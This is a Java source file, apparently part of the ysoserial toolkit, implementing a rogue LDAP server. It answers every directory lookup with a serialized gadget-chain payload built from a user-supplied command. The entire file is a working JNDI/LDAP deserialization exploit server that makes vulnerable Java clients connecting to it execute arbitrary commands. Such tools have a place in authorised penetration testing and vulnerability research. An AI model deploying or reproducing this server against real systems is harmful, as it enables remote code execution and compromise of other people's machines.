package ysoserial.exploit;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.util.Reflections;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPListener {
    private static final String LDAP_BASE = "dc=example,dc=com";
    static byte[] serData;

    private static String getClientConnectionName(Object result) throws Exception {
        Object clientConnect = Reflections.getFieldValue(result, "clientConnection");
        Object name = Reflections.getFieldValue(clientConnect, "name");
        return (String) name;
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            try {
                System.out.println(getClientConnectionName(result));
                System.out.println("---send start---");
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                sendResult(result, base, e);
                System.out.println("---send end---");
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            System.out.println("send serData");
            e.addAttribute("javaClassName", "aa");//无需与ldap链接的引用相同//只要连接上就会返回反序列化
            e.addAttribute("javaSerializedData", serData);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    private static void MiniLDAPServer(String addr, int port) throws Exception {
        InMemoryDirectoryServerConfig conf = new InMemoryDirectoryServerConfig("dc=evil,dc=com");
        conf.setListenerConfigs
            (
                new InMemoryListenerConfig
                    (
                        "listen",
                        InetAddress.getByName(addr),
                        Integer.valueOf(port),
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()
                    )
            );
        conf.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(conf);
        ds.startListening();
        System.out.println("start listening at :" + addr + ":" + port);
    }

    public static void main(String[] args) throws Exception {
//        String addr = argv[0];
        String addr = "0.0.0.0";
        if (args.length < 3) {
            System.err.println(LDAPListener.class.getName() + " <port> <payload_type> <payload_arg>");
            System.exit(-1);
            return;
        }
        int port = Integer.parseInt(args[0]);
        String gadget = args[1];
        String cmd = args[2];
        serData = Serializer.serialize(Utils.makePayloadObject(gadget, cmd));
        MiniLDAPServer(addr, port);
    }
}
